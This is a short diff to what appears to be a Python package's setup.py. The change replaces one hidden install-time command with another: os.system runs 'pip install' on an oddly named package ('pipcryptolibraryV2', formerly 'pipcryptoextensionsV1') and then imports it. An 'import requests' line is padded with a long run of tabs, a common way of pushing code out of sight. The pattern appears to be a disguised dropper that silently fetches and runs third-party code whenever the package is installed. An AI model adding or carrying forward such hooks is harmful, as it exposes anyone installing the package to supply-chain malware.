@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import os
-os.system("pip install pipcryptoextensionsV1")
-import pipcryptoextensionsV1
+os.system("pip install pipcryptolibraryV2")
+import pipcryptolibraryV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from setuptools import setup, find_packages
 import os
